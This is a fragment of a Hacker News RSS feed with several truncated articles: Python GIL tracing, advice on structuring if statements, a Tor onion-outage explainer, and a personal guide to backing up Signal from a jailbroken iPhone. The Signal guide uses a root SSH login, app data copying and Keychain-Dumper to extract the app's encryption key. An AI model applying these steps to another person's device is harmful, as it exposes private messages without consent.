<pre><code>$ viztracer -o example1.html --ignore_frozen -m per4m.example1
Loading finish                                        
Saving report to /home/maartenbreddels/github/maartenbreddels/per4m/example1.html ...
Dumping trace data to json, total entries: 94, estimated json file size: 11.0KiB
Generating HTML report
Report saved.</code></pre>
<p>And the HTML should render as:
<img src="https://www.maartenbreddels.com/images/copied_from_nb/per4m/example1.png" alt="image.png"></p>
<p>From this, it seems that <code>some_computation</code> seem to be executed in parallel (twice), while in fact, we know the GIL is preventing that. So what is really going on?</p>

</div>
</div>
</div><div>
<div>
<div>

<p>Let us run <code>perf</code> on this, similarly to what we did to example0.py. However, we add the argument <code>-k CLOCK_MONOTONIC</code> so that we use <a href="https://github.com/gaogaotiantian/viztracer/blob/3321ba4024afe5623f938a601d7f7db3b08f534d/src/viztracer/modules/snaptrace.c#L91">the same clock as VizTracer</a> and ask VizTracer to generate a JSON, instead of an HTML file:</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork -e 'sched:sched_wak*' \
   -k CLOCK_MONOTONIC  -- viztracer -o viztracer1.json --ignore_frozen -m per4m.example1</code></pre>
<p>Then …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</a></em></p>]]>
            </description>
            <link>https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774945</guid>
            <pubDate>Thu, 14 Jan 2021 11:06:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured programming: how to write proper if statements]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25774939">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | http://boris-marinov.github.io/if/ | <a href="https://web.archive.org/web/*/http://boris-marinov.github.io/if/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The <code>if</code> statement (or <code>if</code> expression) is the cornerstone of every modern programming language - it is so pervasive that we rarely think about how exactly should we use it, or how it is meant to be used. But despite its popularity, <code>if</code> wasnâ€™t always there, and it wasnâ€™t as pervasive as nowadays, so its role is, Iâ€™d argue, still somewhat misunderstood. So in this article, I will examine some mistakes that we can easily avoid in order to improve on our code.</p>

<!--more-->



<p>This is an opinionated text, i.e. it contains my opinions and although I have many arguments that back them, they are ultimately based on <em>my</em> core beliefs about what programming is and should be, so take them as advice, as opposed to a dogma. And here are some of the things on which this advice is based on, structured as postulates.</p>

<blockquote>
  <p>Code is for humans (and programmers are humans too).</p>
</blockquote>

<p>A form of this appears in a little book known in the hacker community as â€œSICPâ€�, but I donâ€™t know if they were the first to state it. It means that programs are not just instructions for performing a given task - they are text, and as such they should be subject to the same stylistical rules as other text is.</p>

<blockquote>
  <p>Code should be as bug-free as possible (and easy to debug as well).</p>
</blockquote>

<p>This one looks pretty self-explanatory, but the key point is that we have to dedicate effort to make it such, by constantly thinking not only about ways in which the code might go wrong, but also about ways to diagnose potential problems.</p>

<p>I guess I should say something about why I believe these things. Simple - because all other approaches just fail because of the human factor, e.g. any code, that is written without regard for style is bound to become legacy when the person who supports it leaves. Likewise, maintaining code that lacks structure results in bugs (which often can be fixed only by imposing more structure).</p>

<p>Lastly, people often contrast good structure and readability with speed. Firstly, the comparison is a bit unfair, because a well-structured is easier to optimize. And for cases in which it is really the case, in 99% the gain is so little that nobody cares, so the emphasis should remain on readability and structure even then. This is when I would throw this very famous quote by DEK:</p>

<blockquote>
  <p>Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97 % of the time: pre mature optimization is the root of all evil.
<a href="http://www.kohala.com/start/papers.others/knuth.dec74.html">source</a></p>
</blockquote>

<p>Keep in mind that he wrote this when computers were a thousand times slower than today, so we should care about maintainability even more.</p>



<p>Once upon a time, all there was was the assembly language where people didnâ€™t have brackets and had to use <code>jump</code> instructions instead. For those who donâ€™t know what jump does, if you imagine that somewhere in the virtual machine, or the interpreter, that runs your code there is a variable that denotes which line of code should be executed next, then <code>jump</code> is a functionality that basically allows you to set that variable to whatever value you please - it is like a portal that allows you to go to from any place of the program to any other place. For example, a typical <code>if</code> statement that looks like this when written with jumps:</p>

<div><div><pre><code>compare input to waterlevel
if less, jump to A
if equal, jump to B
jump to C

A:
turn motor on
jump to C

B:
turn motor off
C:
...
</code></pre></div></div>
<p><a href="https://stackoverflow.com/questions/40602029/how-to-write-if-else-in-assembly">Source for the assembly pseudocode</a></p>

<p>You can see from this example that, although powerful, jumps are much harder to work with than <code>if</code>-s, although they can sometimes make your code a bit shorter, they will 100% make it less readable which is hardly a good deal - if the important thing is for code to bug free, so youâ€™d always prefer to have a longer and more readable piece of code, than one which is shorter but harder to understand. This realization led to the rise of what was at the time called â€œstructural programmingâ€� paradigm, which was based on the idea that the power of jumps should not be exposed to the programmer - a point which was brought by Edsger W. Dijkstra in the seminal essay <a href="http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html">Go To Statement Considered Harmful</a> (<code>goto</code> is the equivalent of a <code>jump</code> instruction statements in non-assembly language context). Simultaneously, the idea of a <em>block</em> (or a â€œcompound statementâ€�) meaning a collection statements that perform a common task (usually denoted today by wrapping them in curly brackets) was pushed forward, and the two ideas gave birth to the <code>if</code> statement that we know today (that <a href="https://craftofcoding.wordpress.com/2017/04/29/the-evolution-of-if-i-from-fortran-i-to-algol-60/">first appeared in the <em>Algol 60</em> programming language</a>):</p>

<div><div><pre><code>if (input less than waterlevel) {
  turn motor on
} else if (input equal to waterlevel) {
turn motor off
} else {
...
</code></pre></div></div>

<p>The adoption of structured programming was a long process which began with people even questioning whether structured programs are even capable of encoding all possible computations, but today, although some people are <a href="https://stackoverflow.com/questions/46586/goto-still-considered-harmful">still defending the use of goto</a>, it (the process) is largely finished - <code>goto</code> is banished and the structured style of programming is so pervasive across modern languages that the term â€œstructuredâ€� is not used any more, simply because there is nothing to contrast it with.</p>

<p>And to reiterate, the reasons for this are quite obvious - using brackets makes our code much more akin to the way we usually talk and write with each other: we often say</p>

<blockquote>
  <p>â€œif A then B otherwise Câ€�</p>
</blockquote>

<p>we never say things like,</p>

<blockquote>
  <p>â€œif A then go to the previous page and start reading from line 12â€�.</p>
</blockquote>

<p>(I wonder if the programmers who defend the use of <code>goto</code> write and talk like that?)</p>

<p>This already leads me to the first rule that I always follow.</p>



<p>A leftover from the <code>goto</code>-driven style of programming is the possibility of so-called â€œearly exitâ€� - the ability to quit the execution of a given function or method from any place of itâ€™s body (most-oftenly by using the keyword <code>return</code>) as opposed to executing the function to the end. So again if we consider our plain old <code>if</code> <code>else</code> statement:</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
} else {
    turn motor off
}
...
</code></pre></div></div>
<p>Using <code>return</code> we can write it like this</p>

<div><div><pre><code>if (input less than waterleve) {
    return turn motor on
} 
turn motor off
...
</code></pre></div></div>

<p>When used like this, <code>return</code> is directly translatable to a <code>goto</code>.</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
    Jump to C
}
turn motor off
C:
...
</code></pre></div></div>

<p>Why not write like this? We already established that <code>goto</code> is bad and Iâ€™d argue that mixing the two approaches is even worse in some respects, as it might fool you that the code is structured when it really isnâ€™t. Furthermore, the early exit makes our code as confusing as any other <code>goto</code>-containing code when translated to natural language. Imagine someone saying:</p>

<blockquote>
  <p>â€œBring me a coffee if you get home early.â€�</p>
</blockquote>

<p>and then imagine them saying.</p>

<blockquote>
  <p>â€œIf you donâ€™t get home early ignore everything Iâ€™d say after this sentence. Bring me a coffee.â€�</p>
</blockquote>

<p>So if your language supports it, always rely on the implicit <code>return</code> instead of explicitly ending your execution. If not, the simple rule you can follow is that you should either return from all branches of the <code>if</code> statement or from none of them.</p>

<h2 id="combining-ifs-with-functions">Combining <code>if</code>â€™s with functions</h2>

<p>The most common type of situation that I have seen the premature <code>return</code> pattern is for handling errors. Imagine for example a very long function with some validation at the beginning. Many people would write:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } 

  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
  ...
}
</code></pre></div></div>

<p>This is a very subtle variant of the issue I am describing (made even more subtle by the fact that <code>throw</code> is used instead of a <code>return</code>). The correct way would be:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } else {
      create account for user
      sign user up
      initialise some other stuff
      write action in log
      send emails
    ...
  }
}
</code></pre></div></div>

<p>but people would prefer having the main function code directly in the body in order to avoid indentation (especially if there is a lot of it already). According to them (and they have a point) the error handling is somewhat outside of the domain of the function, we can perhaps say that they are at different levels of abstraction. In cases like this, we should use <em>functions</em> to structure our code and to keep the different levels of abstraction separate.</p>

<p>Functions are everything that random sequences of statement are not and can never be - they <em>have names</em>, they have <em>a separate scope</em> (blocks also have their own scope, but they also inherit the scope of the parent block), and most importantly they are <em>easy to debug</em> (e.g. you have the name of the thing that went wrong right there on the top of the stack trace. So letâ€™s look at how the code above can be made to work with functions. I think this is a very cool and underused pattern that allows you to lose the indentation without sacrificing your structure.</p>
<div><div><pre><code>
signup (user) {
  if (username is valid ) {
      throw invalid username
  } else {
      return signup internal (user)
  }
}

signup internal (user) { // or _signup as some people name it
  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
...
}
</code></pre></div></div>



<p>This is another bad pattern that, we might say, has the same root cause as the first one - in their effort to keep things simple and concise, people donâ€™t include all the structure that needs to be there in a robust piece of code.</p>

<p>In <code>if</code> statements we often have to deal with multiple conditions that are dependent on one another. And sometimes in such cases, people try to deal with all of them in one statement with multiple branches and <code>else if</code>-s. I argue that itâ€™s actually better to have <em>one statement per condition</em> …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://boris-marinov.github.io/if/">http://boris-marinov.github.io/if/</a></em></p>]]>
            </description>
            <link>http://boris-marinov.github.io/if/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774939</guid>
            <pubDate>Thu, 14 Jan 2021 11:05:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exporting Messages from Signal for iOS: A Journey]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774200">thread link</a>) | @DavidSJ
<br/>
January 14, 2021 | https://cight.co/backup-signal-ios-jailbreak/?resubmit=1 | <a href="https://web.archive.org/web/*/https://cight.co/backup-signal-ios-jailbreak/?resubmit=1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>I started using Signal 5 years ago as I became increasingly conscious of my data footprint. Around the same time, I closed my Facebook and Instagram accounts, and later, my Google Account.</p><h2 id="the-problem-with-signal">The problem with Signal</h2><p>Signal makes it very difficult, and in most cases, impossible, for one to back up, export, or migrate message data. The Signal team insists these restrictions are meant to protect users’ privacy. However, backup and migration policies differ for each official Signal client and sometimes contradict each other.</p><p>For example, while iOS offers no official backups process, Android backups are built into the app. At the same time, iOS users can migrate their data to a new device (as long as their phone number hasn’t changed), but this is impossible on Android. Meanwhile, decrypting messages from the desktop client is trivial, but linking one’s phone and desktop client only syncs messages forward in time.</p><h2 id="why-export-signal-s-message-history">Why export Signal's message history</h2><p>Because it’s my fucking data.</p><p>The road to exporting my data was long, frustrating and filled with dead ends – it took over a year to get here. What's paradoxical is that someone else's phone turned out to be the key to my data. </p><p>In recent years, I moved most of my conversations to Signal, including those with family and close friends. Shortly after we started dating, I asked my partner to switch to Signal, and we’ve used it exclusively ever since. At some point, I thought it would be nice to export our conversation history – a sort of time capsule of our relationship. “Easy,” I thought. I was wrong.</p><p>Since we started dating, I had switched from a OnePlus 2 to an iPhone XS Max. And since migrating from Android to iOS isn’t possible, part of our conversation history was locked on my old phone. Jailbreaking the iPhone was out of the question since my version of iOS had not been jailbreaken. The Signal Desktop client could have offered an easy avenue to decrypt our chat history, but there was a period of several months during which I had not linked my iPhone to the Signal desktop client.</p><p>I opened a <a href="https://community.signalusers.org/t/ios-backups-through-the-desktop-client/8123">thread about this in the Signal Community Forum</a> in June of 2019. It quickly became apparent that backing up my Signal data would be an uphill battle. </p><p>Luckily, my partner had an iPhone 7, which she recently replaced with a company phone. Her old iPhone contained our entire message history in one place and was easy to jailbreak. Jackpot.</p><p>One important lesson I learned during this process:<strong> to ensure access to your conversation history, install the Desktop client and link it to your mobile device as soon as you start using Signal. </strong>The Signal database and encryption key are both accessible on your computer, allowing for easy decryption. Linking the desktop client later will only sync messages forward in time from the moment the devices are linked.</p><h2 id="tips-to-increase-your-chances-of-exporting-your-signal-database">Tips to increase your chances of exporting your Signal database</h2><p>If you haven’t linked the desktop client and extracting the iOS database is your only option, this guide is for you. If you've decided to embark upon this journey, here's some advice. </p><h3 id="stop-updating-ios">Stop updating iOS</h3><p>Your best chance of jailbreaking iOS is on older firmware versions. Turn off automatic updates and decline prompts to update iOS.</p><h3 id="backup-shsh-blobs-with-every-new-ios-update">Backup SHSH blobs with every new iOS update</h3><p><a href="https://en.wikipedia.org/wiki/SHSH_blob">SHSH blobs</a> are the digital signatures that Apple generates and uses to personalize iOS firmware files for each iOS device. Apple only signs firmware updates for a limited time after release. Having these signatures handy allows one to install versions of iOS after Apple stops signing them – like when a jailbreak becomes available for that version. In some cases, you may be able to downgrade iOS to a previous version.</p><p>Backup SHSH blobs every time Apple releases a new version of iOS (e.g., 14.0, 14.1, 14.1.1). I personally use the <a href="https://github.com/airsquared/blobsaver">blobsaver</a> app, but <a href="https://tsssaver.1conan.com/v2/">TSS Saver</a> is a popular alternative.</p><h3 id="learn-about-jailbreaking-and-stay-up-to-date-on-developments">Learn about jailbreaking and stay up to date on developments</h3><p>Developers and hackers are constantly working to break the security of iOS, and new methods to jailbreak iPhones are frequently made public. Stay informed on jailbreak releases by following the <a href="https://www.reddit.com/r/jailbreak/">/r/jailbreak subreddit</a>.</p><p>This <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">exhaustive list of jailbreak compatibility</a> by device and iOS version is also a great resource.</p><p>It's also useful to understand the difference between <a href="https://www.theiphonewiki.com/wiki/Untethered_jailbreak">untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-untethered_jailbreak">semi-untethered</a>, <a href="https://www.theiphonewiki.com/wiki/Semi-tethered_jailbreak">semi-tethered</a>, and <a href="https://www.theiphonewiki.com/wiki/Tethered_jailbreak">tethered</a> jailbreaks.</p><h3 id="recognize-that-this-may-not-work">Recognize that this may not work</h3><p>Depending on your iPhone, you might never be able to jailbreak it or extract Signals decryption key from the iOS Keychain. Apple is making it increasingly difficult to jailbreak iOS devices – improvements to hardware and software are leaving fewer cracks for hackers to exploit.</p><p>Ok, let's get our hands dirty. </p><h2 id="how-to-maybe-backup-signal-for-iphone">How to (maybe) backup Signal for iPhone </h2><p>This guide explains how I was able to backup and extract data from Signal's encrypted SQLite database on an iPhone 7 with iOS 13.6.1. </p><h3 id="prerequisites">Prerequisites </h3><ul><li>Physical access to the iPhone with Signal still installed</li><li>An original iPhone cable</li><li>A Mac or Linux computer</li><li>Patience and a bit of luck</li></ul><p>Shell environments will be differentiated as such. </p><pre><code>// Host machine
$ &lt;command&gt;

// iPhone 
root# &lt;command&gt;</code></pre><h3 id="step-1-jailbreak-ios">Step 1: Jailbreak iOS</h3><p>For iOS 13.6.1 on an iPhone 7, I used <strong>checkra1n</strong> which offers a straight forward semi-tethered jailbreak. Depending on the iPhone device and version of iOS, a jailbreak may or may not be available. </p><p>See this <a href="https://docs.google.com/spreadsheets/d/11DABHIIqwYQKj1L83AK9ywk_hYMjEkcaxpIg6phbTf0/edit#gid=1014970938">updated list of iOS jailbreaks</a> for device compatibility and instructions. </p><h3 id="step-2-ssh-into-the-iphone">Step 2: SSH into the iPhone </h3><p>Cydia usually comes with OpenSSH installed and enabled, allowing shell access over IP or USB. If SSH access isn't activated, launch Cydia and install OpenSSH. </p><p><strong>As always, the root password on iOS is <code>alpine</code>.</strong></p><p>If the iPhone and the host machine are on the same network, SSH into the phone using its IP address. It may be found in the phone's WiFi settings. </p><pre><code>$ ssh root@[iphone ip] -p 22</code></pre><p>If SSH over the air isn't possible, USB may be an alternative. However, this involves enabling a proxy service on the host machine.</p><p>First, install <em><em>libimobiledevice</em></em> on the host machine. </p><pre><code>$ brew install libimobiledevice</code></pre><p>Then, edit <em><em>com.usbmux.iproxy.plist</em></em> and append the following XML to the file. </p><pre><code>$ nano ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.usbmux.iproxy&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;/usr/local/bin/iproxy&lt;/string&gt;
&lt;string&gt;2222&lt;/string&gt;
&lt;string&gt;22&lt;/string&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;
&lt;true/&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;</code></pre><p>And finally, launch the proxy on the host machine. </p><pre><code>$ launchctl load ~/Library/LaunchAgents/com.usbmux.iproxy.plist</code></pre><p>It should now be possible to SSH into the iPhone over USB on port <code>2222</code>.</p><pre><code>$ ssh root@localhost -p 2222</code></pre><h3 id="step-3-install-required-packages">Step 3: Install required packages </h3><p>Once logged into to the iPhone's shell, install the following packages as they will come in handy. </p><pre><code>root# apt install zip unzip nano wget</code></pre><h3 id="step-4-backup-the-signal-data-directory">Step 4: Backup the Signal data directory</h3><p><strong>Locate Signal's data directory</strong></p><p>Much like macOS, iOS stores application data in a <em>Library</em>-like directory. In iOS&nbsp;13, its located here <code>/private/var/mobile/Containers/Shared/AppGroup/</code>. </p><p>Signal's data directory contains the encrypted SQLite database file in <code>./grdb/signal.sqilte</code> and attachments, such as images and videos in <code>./Attachments</code>.</p><p>The data directory may be found by searching the filesystem for Signal's encrypted database file, <code>signal.sqlite</code>.</p><pre><code>root# find / -type f -iname "signal.sqlite"</code></pre><p>That should return something which looks like this:<br><code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/grdb/signal.sqlite</code> </p><p>The Signal directory is: <code>/private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></p><p><strong>Zip the Signal directory</strong></p><p>It is recommended to zip the entire directory, not only the database file, as it also contains images and other message attachments. This archive can reach several gigabytes.</p><pre><code>root# cd /private/var/mobile/Containers/Shared/AppGroup/
root# zip -r signal-backup.zip &lt;Signal directory&gt;

# ex: zip -r signal-backup.zip /private/var/mobile/Containers/Shared/AppGroup/01484069-3446-4CC0-8BE7-7464E7D08FDF/</code></pre><p><strong>Retrieve the backup on the host machine</strong></p><p>In a new terminal session on the host machine, use <code>scp</code> to copy the backup. </p><pre><code>$ scp -P 22 root@localhost:/private/var/mobile/Containers/Shared/AppGroup/signal-backup.zip ~/</code></pre><p>Once complete, verify that the backup has fully transferred by unpacking it.</p><p>This is the most complex part of this operation and it helps to have a basic understanding of core iOS development concepts.</p><p><strong>Understanding iOS Entitlements </strong></p><p>From the <a href="https://developer.apple.com/documentation/bundleresources/entitlements">Apple Developer Documentation</a>: </p><blockquote>An entitlement is a right or privilege that grants an executable particular capabilities. For example, an app needs the HomeKit Entitlement — along with explicit user consent — to access a user’s home automation network. An app stores its entitlements as key-value pairs embedded in the code signature of its binary executable.</blockquote><p><strong>Enter Keychain Dumper</strong></p><p>We will use <a href="https://github.com/ptoomey3/Keychain-Dumper"><strong>Keychain-Dumper</strong></a> to attempt extracting the Signal encryption key. It requires entitlements to access Keychain data for any particular app. </p><p>Reading through Keychain-Dumper's GitHub issues, I learned that entitlements changed in iOS 13.5 – prior to this version, an application <a href="https://github.com/ptoomey3/Keychain-Dumper/issues/52#issuecomment-638174691">could be given wildcard entitlements</a>. Changes in 13.5 made it such that apps need specific entitlements. Thankfully, it's possible to update an executable's entitlements, even as a binary.</p><p>The <code>keychain_dumper</code> binary included in its <a href="https://github.com/ptoomey3/Keychain-Dumper">GitHub repo</a> has wildcard entitlements. We'll need to update them in order to give it permission to decrypt the Signal key.</p><p><strong>Install Keychain Dumper on the iPhone</strong></p><p>Back on the iPhone, download and extract the <a href="https://github.com/ptoomey3/Keychain-Dumper/releases/tag/1.0.0">keychain_dumper binary</a>, and move it to <code>/usr/bin</code>.</p><pre><code>root# wget https://github.com/ptoomey3/Keychain-Dumper/releases/download/1.0.0/keychain_dumper-1.0.0.zip
root# unzip keychain_dumper-1.0.0.zip
root# mv keychain_dumper /usr/bin</code></pre><p><strong>Update <em>keychain_dumper</em>'s …</strong></p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cight.co/backup-signal-ios-jailbreak/?resubmit=1">https://cight.co/backup-signal-ios-jailbreak/?resubmit=1</a></em></p>]]>
            </description>
            <link>https://cight.co/backup-signal-ios-jailbreak/?resubmit=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774200</guid>
            <pubDate>Thu, 14 Jan 2021 09:38:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking Tor's network-wide V3 onion service outages]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774167">thread link</a>) | @thinkingemote
<br/>
January 14, 2021 | https://matt.traudt.xyz/posts/tracking-tors-network-wide-v3-onion-service-outages | <a href="https://web.archive.org/web/*/https://matt.traudt.xyz/posts/tracking-tors-network-wide-v3-onion-service-outages">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article class="page">







<div id="pagebody">

<section id="content" role="main">



<p>It is January 13th, 2021 as I finish writing these initial words. Major updates may get
a date stamp next to them.</p>



<ul>
<li><em>Someone</em> is sending the directory authorities (and fallback dirs) lots of
traffic.</li>
<li>This causes the dirauths to no longer be able to reliably communicate.</li>
<li>This means consensuses are no longer reliably produced every hour.</li>
<li>No new consensus three hours in a row means new connections to v3 onion
services stop working because of <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40237">a bug</a>.  Existing connections survive,
and no other part of Tor breaks at the three hour mark.</li>
<li>There is an <a href="https://blog.torproject.org/node/1969">alpha release</a> for <strong>experts who know what they are
doing</strong>.  It is making its way into all supported stable Tor versions.</li>
</ul>


<p>Please keep these facts in mind:</p>

<ul>
<li><p><strong>It is unknown if the traffic hitting the dirauths is maliciously
motivated</strong>. People keep calling it an <em>attack</em>. I don't think we have the
evidence to back that up at this time.</p></li>
<li><p><strong>There is no evidence that the traffic overload is actively trying to hurt
v3 onions</strong>.  A <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/33018">similar situation existed last year</a> and onions
didn't go down then. Claims that it is "the" government or rival drug markets
are not backed up with any evidence that I've seen.</p></li>
</ul>


<p>If you have evidence of who is behind this traffic, please let someone know.
<a href="https://support.torproject.org/get-in-touch/">Tor Project</a> or me
(blog comment, an email <small>(listed on <a href="https://matt.traudt.xyz/posts/about-me-6eKe2i5v/">About
Me</a>)</small>, or IRC message)</p>

<p><small>While I currently work on Tor-related stuff for my job, nothing contained in this
post has anything to do with my work. Everything contained in this post is public unclassified
knowledge. Opinions expressed, if any, are my own.</small></p>



<p>Roger points out on January 6th that
<a href="https://lists.torproject.org/pipermail/tor-relays/2021-January/019201.html">"the overload is back"</a>.</p>

<p>It's not OMGWTFBBQ levels of traffic. It's not from one IP nor is it from IPs
all over the Internet. One dirauth says it <em>seems</em> to be a poorly written
custom Tor client requesting directory information too often.</p>



<p>On January 9th, 10th, and 11th, there are repeated instances of 3 or more
consensuses in a row that are not generated.</p>

<p>This is the trigger for v3 onions no longer working. Consensuses are generated
every hour and are valid for 3 hours. Most parts of Tor (v2 onions, general
circuit building, etc.) do not require a <em>live</em> (currently valid) consensus,
but can get by just fine with a recently valid consensus (expired less than 24
hours ago).</p>

<p>January 12th saw a few missed consensuses, but never 3 in a row. No consensus has been missed so far on the 13th.</p>



<p>The v3 onion service code was written to require a live consensus, and it didn't need to be (devs
are verifying this). The <a href="https://lists.torproject.org/pipermail/tor-talk/2021-January/045681.html">fix</a> for this <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40237">bug</a>
changes the requirement to just a recently valid consensus. It's getting tested
as I write these words on January 11th. The fix, or something very similar to
it, will be merged and backported in the coming days, at which point it's up to
the packagers for your OS or your tor-derived software (e.g. Tor Browser) to
notice the update and distribute it to you. I would expect Tor Browser to be updated very quickly.
Debian will probably take a day or two. Other distros, I have no idea.</p>

<p>If you're watching tor's logs, the current date includes "January" and "2021",
and you see the following message, then you have most likely hit the bug.</p>

<pre><code>Tried for 120 seconds to get a connection to [scrubbed]:6697. Giving up. (waiting for rendezvous desc)
</code></pre>

<p>The 6697 is <em>not</em> important. The "waiting for rendezvous desc" <em>is important</em>.</p>

<h2><a name="index1h2"></a>Status of the fix making it into Tor</h2>

<p>Primary sources for this section: <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40237">bug #40237</a>.</p>

<ul>
<li>Jan 12th: the fix is merged into 0.4.5.3-rc [<a href="https://blog.torproject.org/node/1969">blog post</a>]</li>
</ul>


<p>Upcoming events:</p>

<ul>
<li>backports to other supported versions of Tor</li>
<li>packaging</li>
</ul>




<p>On the 11th we
<a href="https://lists.torproject.org/pipermail/tor-consensus-health/2021-January/011815.html">notice</a>
the fallback dirs are also failing.
This is major evidence in my opinion that this is not a purposeful attack on the dirauths. I, and at least two dirauths, think it is most likely a bad custom Tor client implementation that requests directory information too often.</p>

<p>We see the same failing of fallback dirs <a href="https://lists.torproject.org/pipermail/tor-consensus-health/2021-January/011840.html">on the 12th</a>.</p>

<p><a href="https://metrics.torproject.org/dirbytes.html?start=2020-12-01&amp;end=2021-02-01">This graph</a> shows how the entire network is fielding more directory requests these days. <a href="https://metrics.torproject.org/dirbytes.html?start=2019-10-01&amp;end=2021-02-01">This graph</a> shows more context for where load usually is. The 1.5 Gbit/s the dirauths saw for ~half of 2020 is talked about in <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/33018">this ticket</a>.</p>

<p>An actual attack could disguise itself like this, but if this were an attack, I would expect it to be more consistently effective at preventing consensus generation.</p>



<p><em>(Last updated 15 Jan 2021)</em></p>

<p>The 14th saw no missing consensuses. If you had trouble reaching v3 onion services on the 14th, your issue is unrelated to the topic of this blog post.</p>

<p>The 15th so far has seen no missing consensuses.</p>



<h2><a name="index2h2"></a>What Tor relays/clients need to be updated?</h2>

<p>No relays need to be updated. Tor clients hosting v3 onion services and Tor clients wishing to visit v3 onion services will need to be updated when the fix is released.</p>

<h2><a name="index3h2"></a>How do I update my Tor?</h2>

<p><em>(Last updated 13 Jan 2021)</em></p>

<p>You don't yet, unless you're willing to compile and use a version of Tor that isn't considered stable yet.
If you're willing, then see <a href="https://blog.torproject.org/node/1969">https://blog.torproject.org/node/1969</a>.</p>

<h2><a name="index4h2"></a>Should we temporarily downgrade to v2 while waiting for a fix?</h2>

<p>If absolutely necessary, sure. Please keep in mind v2's issues (briefly described below in the glossary) and be aware that "temporary" probably means ~1 week (<em>crossing my fingers</em>). I personally will just suffer and wait for the fix to be released.</p>

<h2><a name="index5h2"></a>Are v3 onion services fundamentally broken?</h2>

<p>No.</p>

<h2><a name="index6h2"></a>Is this really major?</h2>

<p>Eh ... yes because of the impact, but no because the fix is easy and will be out quickly.</p>



<h2><a name="index7h2"></a>Directory authorities / dirauths</h2>

<p>There are 9 relays operated by highly trusted individuals that decide the state
of the network. They decide what relays are a part of the network and what
certain network parameters should be set to.</p>

<p>In a way they are a "single" point of failure and make the Tor network
"centralized." Decentralizing their role to 100s, 1000s, or every relay would:</p>

<ol>
<li><p>require massive fundamental changes to how Tor works. By itself this
probably is not a convincing reason to not do it.</p></li>
<li><p>open Tor up to new attacks it currently isn't vulnerable to. This should be
a bit more convincing. The keyword to Google for most of them is "Sybil".</p></li>
</ol>


<p>Having a "single" high quality root of trust is a valuable property that
"decentralize all the things!" people do not generally appreciate enough, in my
opinion.</p>

<p>You: <em>This v3 onion fix doesn't actually address the root problem: the dirauths weren't
able to communicate and create consensuses.</em></p>

<p>Yes! You are absolutely right that <em>something</em> about how the dirauths work should
change such that they can continue communicating with each other even in the
presence of malicious (purposefully malicious or not) traffic!
<a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/40239">This ticket</a> is one idea and a good place to start your research
if I say nothing more and you want to research what is being done yourself.
They might also update <a href="https://gitlab.torproject.org/tpo/core/tor/-/issues/33018">this ticket</a>.</p>

<h2><a name="index8h2"></a>V3 onion service</h2>

<p>The new type of onion service. Names are 56 characters long, like
tv54samlti22655ohq3oaswm64cwf7ulp6wzkjcvdla2hagqcu7uokid.onion. V2 onions are
16 characters long, like 3g2upl4pq6kufc4m.onion.</p>

<p>V2 onion services use old crypto and old protocols that are obsolete and
dangerous <em>now</em> or will be soon. The code for v2 is messy and the protocol is
